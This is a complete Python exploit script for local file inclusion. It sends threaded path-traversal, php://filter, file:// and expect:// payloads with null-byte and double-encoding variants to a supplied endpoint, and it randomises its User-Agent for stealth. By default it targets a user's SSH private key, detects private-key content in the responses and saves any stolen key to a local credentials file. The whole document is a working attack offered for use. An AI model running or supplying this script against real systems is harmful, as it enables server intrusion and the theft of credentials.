#!/usr/bin/env python3
import requests
import time
import argparse
import logging
import urllib.parse
import base64
import concurrent.futures
import threading
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def setup_logging(logfile=None, verbose=False):
    """
    Configure logging to output to console and optionally to a file.
    """
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] - %(message)s')

    # Console handler
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG if verbose else logging.INFO)
    ch.setFormatter(formatter)
    logger.addHandler(ch)

    # File handler, if logfile is provided
    if logfile:
        fh = logging.FileHandler(logfile)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        logger.addHandler(fh)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Production-grade LFI Exploitation Script for Dumping User Credentials"
    )
    parser.add_argument("-u", "--url", required=True,
                        help=("Full vulnerable endpoint URL. "
                              "Example: http://example.com/download-pdf?filename="))
    parser.add_argument("--username", required=True,
                        help="Target username (e.g. john). This will default the file to /home/<username>/.ssh/id_rsa if --file is not provided.")
    parser.add_argument("--file",
                        help=("File path to dump. Defaults to /home/<username>/.ssh/id_rsa if not provided."))
    parser.add_argument("--path-as-is", action="store_true",
                        help="Use the payload path as is, without encoding variations")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of concurrent threads (default: 10)")
    parser.add_argument("--logfile", help="File to save logs")
    parser.add_argument("--verbose", action="store_true",
                        help="Increase output verbosity")
    return parser.parse_args()

def create_session():
    """
    Create a persistent HTTP session with a retry mechanism.
    """
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.5,
                    status_forcelist=[500, 502, 503, 504],
                    raise_on_status=False)
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    # Optional: Randomize User-Agent on each request for stealth
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
        ])
    })
    return session

# Global flag to signal when a valid credential is found.
found_event = threading.Event()
result_lock = threading.Lock()

def generate_lfi_variants(payload, path_as_is):
    """
    Generate different encoding variants for a given payload.
    Appends a null byte to bypass some sanitization.
    """
    variants = []
    nullbyte = "%00"
    if path_as_is:
        variants.append(payload + nullbyte)
    else:
        # Original payload with null byte
        variants.append(payload + nullbyte)
        # URL-encoded once
        once = urllib.parse.quote(payload) + nullbyte
        variants.append(once)
        # URL-encoded twice
        twice = urllib.parse.quote(urllib.parse.quote(payload)) + nullbyte
        variants.append(twice)
    return variants

def process_lfi_response(text):
    """
    Check if the response contains a valid private key or credential.
    If not found directly, try base64 decoding the content.
    """
    if "-----BEGIN" in text and "PRIVATE KEY" in text:
        return text
    try:
        decoded = base64.b64decode(text).decode('utf-8')
        if "-----BEGIN" in decoded and "PRIVATE KEY" in decoded:
            logging.info("[+] Base64 decoded content appears to be a private key.")
            return decoded
    except Exception as e:
        logging.debug("Base64 decoding failed: %s", e)
    return None

def try_payload(session, full_endpoint, variant, base_payload):
    """
    Attempt a single payload variant on the provided full endpoint URL.
    """
    if found_event.is_set():
        return None
    full_url = f"{full_endpoint}{variant}"
    logging.debug("Trying URL: %s", full_url)
    try:
        response = session.get(full_url, timeout=10)
        processed = process_lfi_response(response.text)
        if processed:
            with result_lock:
                if not found_event.is_set():
                    logging.info(f"[✔] LFI successful with payload: {base_payload} | Variant: {variant}")
                    outfile = "credentials_dump.txt"
                    with open(outfile, "w") as f:
                        f.write(processed)
                    logging.info(f"[+] Credentials saved to {outfile}")
                    found_event.set()
                    return full_url
        else:
            logging.debug(f"[-] No valid content with variant: {variant}")
    except requests.exceptions.RequestException as e:
        logging.error("[-] Request failed for URL %s: %s", full_url, e)
    return None

def test_lfi(session, full_endpoints, target_file, path_as_is, threads):
    """
    Iterate through payload variants across all provided full endpoints until valid credentials are found.
    """
    logging.info("[+] Starting LFI tests to retrieve credentials...")

    # Define a list of base payloads with various techniques.
    base_payloads = [
        target_file,
        "../../../../../../../../" + target_file.lstrip("/"),
        "../../../" + target_file.lstrip("/"),
        "file://" + target_file,
        "php://filter/convert.base64-encode/resource=" + target_file,
        "php://filter/read=convert.base64-encode/resource=" + target_file,
        "....//....//" + target_file.lstrip("/"),
        "/..%2f..%2f..%2f..%2f" + target_file.lstrip("/"),
        "expect://" + target_file.lstrip("/")
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_payload = {}
        # For every full endpoint, try all payload variants.
        for full_endpoint in full_endpoints:
            for base in base_payloads:
                variants = generate_lfi_variants(base, path_as_is)
                for variant in variants:
                    future = executor.submit(try_payload, session, full_endpoint, variant, base)
                    future_to_payload[future] = (full_endpoint, base, variant)

        # Process completed futures and stop if a successful payload is found.
        for future in concurrent.futures.as_completed(future_to_payload):
            if found_event.is_set():
                break
            try:
                result = future.result()
                if result:
                    return result
            except Exception as exc:
                full_endpoint, base, variant = future_to_payload[future]
                logging.error("Payload %s (%s) on endpoint %s generated an exception: %s", base, variant, full_endpoint, exc)

    if not found_event.is_set():
        logging.info("[-] LFI not exploitable with provided payloads.")
    return None

def main():
    args = parse_args()
    setup_logging(args.logfile, args.verbose)

    # Determine the target file based on the provided username.
    target_file = args.file if args.file else f"/home/{args.username}/.ssh/id_rsa"
    logging.info("Target file to dump: %s", target_file)

    # Process provided full endpoint(s): split by comma and trim whitespace.
    full_endpoints = [ep.strip() for ep in args.url.split(",")]
    logging.info("Using full endpoint(s): %s", full_endpoints)

    session = create_session()
    start_time = time.time()
    result = test_lfi(session, full_endpoints, target_file, args.path_as_is, args.threads)
    end_time = time.time()
    logging.info("Total execution time: %.2f seconds", end_time - start_time)

    if result:
        logging.info("Exploitation successful: %s", result)
    else:
        logging.info("Exploitation failed. No valid credentials found.")

if __name__ == "__main__":
    main()
